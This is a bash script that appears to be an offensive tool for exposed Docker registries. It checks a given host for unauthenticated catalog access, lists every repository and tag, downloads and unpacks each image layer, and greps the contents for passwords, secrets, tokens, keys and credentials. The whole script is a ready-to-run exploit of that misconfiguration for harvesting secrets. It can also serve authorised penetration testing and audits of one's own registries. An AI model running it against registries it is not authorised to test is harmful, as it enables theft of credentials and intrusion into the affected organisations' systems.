#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color

SEARCH_KEYWORDS=("user" "username" "password" "pass" "secret" "key" "token" "credential")

check_dependency() {
    if ! command -v $1 &> /dev/null; then
        echo -e "${RED}Error: $1 is not installed${NC}"
        exit 1
    fi
}

check_dependency curl
check_dependency jq
check_dependency gzip
check_dependency tar

REGISTRY=$1
if [ -z "$REGISTRY" ]; then
    echo -e "${RED}Error: Please provide registry IP/domain as argument${NC}"
    exit 1
fi

OUTPUT_DIR="registry_analysis_$(date +%s)"
mkdir -p $OUTPUT_DIR

echo -e "${YELLOW}[*] Checking registry access...${NC}"
if ! curl -i "https://$REGISTRY/v2/_catalog" | grep -q "200 OK"; then
    echo -e "${GREEN}Not vuln${NC}"
    exit 0
fi

echo -e "${GREEN}[+] Registry is accessible${NC}"

repos=$(curl -s "https://$REGISTRY/v2/_catalog" | jq -r '.repositories[]')

for repo in $repos; do
    echo -e "\n${YELLOW}[*] Processing repository: $repo${NC}"
    REPO_DIR="$OUTPUT_DIR/$repo"
    mkdir -p "$REPO_DIR"
    
    tags=$(curl -s "https://$REGISTRY/v2/$repo/tags/list" | jq -r '.tags[]')
    
    for tag in $tags; do
        echo -e "\n${YELLOW}  [*] Processing tag: $tag${NC}"
        TAG_DIR="$REPO_DIR/$tag"
        mkdir -p "$TAG_DIR"
        
        manifest=$(curl -s "https://$REGISTRY/v2/$repo/manifests/$tag")
        echo "$manifest" > "$TAG_DIR/manifest.json"
        
        layers=$(echo "$manifest" | jq -r '.layers[].digest')
        
        for layer in $layers; do
            LAYER_DIR="$TAG_DIR/${layer//:/_}"
            mkdir -p "$LAYER_DIR"
            
            echo -e "    ${YELLOW}[*] Downloading layer: $layer${NC}"
            curl -s "http://$REGISTRY/v2/$repo/blobs/$layer" -o "$LAYER_DIR/layer.gz"
            
            echo "    ${YELLOW}[*] Extracting layer...${NC}"
            gzip -d "$LAYER_DIR/layer.gz"
            tar -xf "$LAYER_DIR/layer" -C "$LAYER_DIR"
            rm "$LAYER_DIR/layer"
            
            echo "    ${YELLOW}[*] Searching sensitive data...${NC}"
            find "$LAYER_DIR" -type f | while read file; do
                for keyword in "${SEARCH_KEYWORDS[@]}"; do
                    if grep -HnriI --color=auto "$keyword" "$file"; then
                        echo -e "${RED}      [!] Potential sensitive data found in: $file${NC}"
                    fi
                done
            done
        done
    done
done

echo -e "\n${GREEN}[+] Analysis complete. Data saved to: $OUTPUT_DIR${NC}"
